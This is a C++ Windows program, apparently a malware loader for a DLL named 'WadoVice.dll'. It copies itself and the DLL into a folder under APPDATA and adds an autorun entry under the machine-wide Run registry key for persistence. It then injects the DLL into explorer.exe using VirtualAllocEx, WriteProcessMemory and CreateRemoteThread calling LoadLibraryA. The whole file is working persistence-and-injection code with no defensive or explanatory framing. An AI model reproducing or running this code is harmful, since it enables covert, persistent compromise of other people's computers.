#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <filesystem>
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

const std::string dll_name = "WadoVice.dll";

DWORD get_explorer_pid()
{
    std::string target_process_name = "explorer.exe";

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(entry);

    Process32First(snap, &entry);

    do
    {
        if(std::string(entry.szExeFile) == target_process_name)
            return entry.th32ProcessID;
    } while (Process32Next(snap, &entry));

    return 0;
}

void write_reg_autorun(std::string path)
{
    HKEY hKeyFolder;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKeyFolder, NULL);

    RegSetValueEx(hKeyFolder, "WadoVice", 0, REG_SZ, (LPBYTE)path.c_str(), path.size());

    RegCloseKey(hKeyFolder);
}

void directory_check_and_prepare()
{
    char directory[FILENAME_MAX];
    char* appdata = getenv("APPDATA");
    std::string desired = std::string(appdata) + "\\" + std::string("WadoVice");
    GetCurrentDirectory(FILENAME_MAX, directory);
    if(strcmp(directory, appdata) != 0)
    {
        char exe_name[FILENAME_MAX];
        GetModuleFileName(NULL, exe_name, FILENAME_MAX);

        if(!std::filesystem::is_directory(desired))
            std::filesystem::create_directory(desired);

        std::string f_injector = exe_name;
        std::string t_injector = desired + "\\" + std::string(PathFindFileName(exe_name));

        std::string f_dll = std::string(directory) + "\\" + std::string(dll_name);
        std::string t_dll = desired + "\\" + std::string(dll_name);
        
        if(std::filesystem::exists(t_injector))
            std::filesystem::remove(t_injector);
        if(std::filesystem::exists(t_dll))
            std::filesystem::remove(t_dll);

        std::filesystem::copy(f_injector, t_injector);
        std::filesystem::copy(f_dll, t_dll);

        write_reg_autorun(t_injector);
    }
}

INT __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
    directory_check_and_prepare();

    char directory[FILENAME_MAX];
    GetCurrentDirectory(FILENAME_MAX, directory);

    std::string dll_path = std::string(directory) + "\\" + dll_name;

    // Open explorer.exe and get handle
    HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, get_explorer_pid());

    // Get address of the LoadLibrary function
    LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // Alloc memory for dll name
    LPVOID mem = VirtualAllocEx(handle, NULL, dll_path.size(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    // Write the argument to LoadLibraryA
    SIZE_T written = 0;
    int n = WriteProcessMemory(handle, mem, dll_path.c_str(), dll_path.size(), &written);

    // Inject DLL
    HANDLE threadID = CreateRemoteThread(handle, NULL, 0, (LPTHREAD_START_ROUTINE)addr, mem, NULL, NULL);

    CloseHandle(handle);

    return 0;
}